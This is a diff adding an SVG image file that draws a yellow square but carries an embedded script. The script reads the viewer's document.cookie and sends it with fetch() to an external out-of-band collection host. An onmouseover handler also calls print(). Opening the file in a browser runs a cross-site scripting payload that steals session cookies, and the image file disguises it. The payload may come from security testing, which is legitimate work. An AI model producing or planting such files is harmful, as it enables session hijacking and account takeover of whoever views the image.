@@ -1,0 +1,8 @@
+<svg  xmlns="http://www.w3.org/2000/svg" onmouseover="print()">
+  <script>
+    let monster = document.cookie;
+    let home = "https://d9pdtc50nuunolrfq2s0te6tcpwtfruih.oast.site/?cookie=" + monster
+    fetch(home).then(response => console.log(response.status)).catch(error => console.log(error));
+  </script>
+  <rect width="100" height="100" fill="yellow"/>
+</svg>
